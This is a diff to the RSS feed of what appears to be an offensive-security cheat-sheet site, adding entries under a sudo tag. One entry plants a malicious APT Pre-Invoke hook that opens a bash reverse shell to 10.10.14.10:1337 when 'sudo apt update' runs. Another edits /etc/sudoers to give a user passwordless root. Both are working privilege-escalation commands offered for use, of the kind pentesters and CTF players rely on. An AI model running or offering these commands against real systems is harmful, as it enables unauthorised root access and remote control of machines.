@@ -8,6 +8,13 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/@sudo/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Apt</title>
+      <link>https://tldrbins.github.io/apt/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/apt/</guid>
+      <description> Privesc Abuse apt update # Create a malicious config echo &amp;#39;APT::Update::Pre-Invoke {&amp;#34;bash -c &amp;#39;\&amp;#39;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.10/1337 0&amp;gt;&amp;amp;1&amp;#39;\&amp;#39;&amp;#39;&amp;#34;}&amp;#39; &amp;gt; /etc/apt/apt.conf.d/evil # Exploit sudo apt update -y </description>
+    </item>
+    <item>
       <title>npm</title>
       <link>https://tldrbins.github.io/npm/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -26,7 +33,7 @@
       <link>https://tldrbins.github.io/sudoers/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/sudoers/</guid>
-      <description> Privesc Abuse /etc/sudoers # IF you have control over `/etc/sudoers` chmod 666 /etc/sudoers echo &amp;#39;user ALL=(ALL) NOPASSWD: ALL&amp;#39; &amp;gt;&amp;gt; /etc/sudoers chmod 440 /etc/sudoers </description>
+      <description> Privesc Abuse /etc/sudoers # IF you have control over `/etc/sudoers` chmod 600 /etc/sudoers echo &amp;#39;user ALL=(ALL) NOPASSWD: ALL&amp;#39; &amp;gt;&amp;gt; /etc/sudoers chmod 440 /etc/sudoers </description>
     </item>
   </channel>
 </rss>
